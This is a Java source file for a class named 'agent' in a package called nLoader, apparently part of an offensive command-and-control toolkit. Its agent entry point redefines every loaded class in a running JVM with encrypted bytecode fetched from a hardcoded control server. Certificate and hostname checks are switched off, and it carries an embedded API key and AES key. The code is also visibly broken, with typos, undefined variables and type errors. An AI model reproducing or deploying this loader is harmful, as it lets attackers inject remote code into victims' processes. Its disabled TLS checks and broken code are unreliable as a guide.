package com.nocebo.nLoader;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.security.spec.AlgorithmParameterSpec;
import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import com.nocebo.nCore.Main.utilitarian;

public class agent
{
    static public String urlData = "https://192.168.1.157/59009";
    static public String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
    static public String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";

    public static void agentmain(String agentArgs, Instrumentation inst) 
    {
        Class[] loadedClassSet = getLoadedClasses(inst);
        for (int c=0;c<loadedClassSet.length;c++)
        {
            Class originalDef = (Class) loadedClassSet[c]s;
            byte[] classBytes = getClassBytes(originalDef.getCanonicalName());
            instr.redefineClasses(new ClassDefinition(originalDef, classBytes));
        }
    }

    public static Class[] getLoadedClasses(Instrumentation inst)
    {
        //stub will have a definition for every class and method in the default set
        Class[] loadedClassSet = inst.getAllLoadedClasses();
        return loadedClassSet;
    }

    private byte[] classRequest(String classicalName) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
    {
        //stackoverflow provided boilerplate

        SSLContext sslCon = SSLContext.getInstance("TLS");
        sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
        String classNameEncoded = new String(Base64.getUrlEncoder().encode(classicalName.getBytes()));

        URL ctrlUrl = new URI(String.format("%s?v=%s",urlData,classNameEncoded)).toURL();

        HttpsURLConnection connMan;
        try
        {
            connMan = (HttpsURLConnection) ctrlUrl.openConnection();

            connMan.setRequestMethod("GET");
            connMan.setDoOutput(true);
            connMan.setRequestProperty(
                "Cookie",
                String.format(
                    "__Secure-YEC=%s",
                    new String(Base64.getUrlEncoder().encode(apiKey.getBytes())),
                    apiKey
                )
            );

            HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());

            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                 return true;
               }
            };
            connMan.setHostnameVerifier(allHostsValid);

            if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
            {
                String nonceData = connMan.getHeaderField("set-cookie").split("=")[1];
                BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                String responseData = connInReader.readLine();
                connOutWriter.close();
                connInReader.close();

                byte[] decodedResponseData = decrypt(
                    Base64.getDecoder().decode(
                        responseData
                    ),
                    agentKey.getBytes(),
                    nonceData.getBytes()
                );
                return decodedResponseData;

            }
            else
            {
                return "null";
            }
        }
        catch (Exception e)
        {
            return "null";
        }
    }

    //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
    public class InvalidCertificateTrustManager implements X509TrustManager
    {
        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        @Override
        public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

        }

        @Override
        public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
        }    
    }    

    //replicates my lycanthropy aesgcm
    public static byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
        return cipher.doFinal(plaintext);
    }

    public static byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
        return cipher.doFinal(encrypted);
    }

    private static Cipher initCipher() throws Exception
    {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        return cipher;
    }

    private static SecretKey initKey(byte[] keyBytes) throws Exception
    {
        SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
        return key;
    }     
}